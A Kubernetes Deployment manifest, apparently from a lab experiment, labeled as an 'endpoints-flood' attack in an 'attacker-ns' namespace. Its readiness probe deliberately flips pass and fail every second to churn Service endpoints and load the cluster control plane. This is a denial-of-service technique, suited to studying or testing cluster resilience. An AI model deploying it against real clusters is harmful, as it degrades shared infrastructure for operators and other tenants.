apiVersion: apps/v1
kind: Deployment
metadata:
  name: endpoints-flood-1
  namespace: attacker-ns
  labels:
    attack: endpoints-flood
spec:
  replicas: 1
  selector:
    matchLabels:
      app: endpoints-flood-1
  template:
    metadata:
      labels:
        app: endpoints-flood-1
        attack: endpoints-flood
        group: endpoints-flood-target
    spec:
      nodeName: k8s-w1
      containers:
      - name: flooder
        image: busybox:1.36
        command: ["sleep", "infinity"]
        ports:
        - containerPort: 80
        readinessProbe:
          exec:
            command: ["sh", "-c", "test $(( $(date +%s) % 2 )) -eq 0"]
          periodSeconds: 1
          timeoutSeconds: 1
          failureThreshold: 1
          successThreshold: 1
        resources:
          requests:
            cpu: "10m"
            memory: "16Mi"
          limits:
            cpu: "50m"
            memory: "32Mi"
        securityContext:
          allowPrivilegeEscalation: false
          privileged: false
          readOnlyRootFilesystem: true
          runAsNonRoot: true
          runAsUser: 1000
          seccompProfile:
            type: RuntimeDefault
          capabilities:
            drop: ["ALL"]
---
